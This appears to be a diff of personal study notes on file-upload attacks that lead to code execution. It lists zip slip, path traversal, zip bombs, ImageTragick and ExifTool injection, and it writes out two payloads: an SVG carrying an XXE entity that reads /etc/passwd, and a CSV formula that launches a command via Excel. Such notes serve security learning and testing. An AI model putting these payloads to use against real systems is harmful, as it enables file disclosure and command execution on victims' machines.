@@ -4,13 +4,13 @@ zipslip // use path traversal zip file to access system files
 
 *
 Yes, uploading non-PHP files can still lead to RCE in certain scenarios:
-1-SVG files:
+XML: 1-SVG files:
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg xmlns="http://www.w3.org/2000/svg">
     <script>alert(xxe)</script>
 </svg>
-2-ZIP files can trigger:
+done: 2-ZIP files can trigger:
 Path traversal
 Zip slip
 Zip bombs
@@ -18,6 +18,8 @@ Archive command injection
 3-Image files with malicious metadata that gets processed:
 ImageMagick vulnerabilities (ImageTragick)
 ExifTool command injection
+
+reached here
 4-CSV files in Excel:
 =cmd|' /C calc'!A0
 5-Files that trigger vulnerabilities in processing libraries:
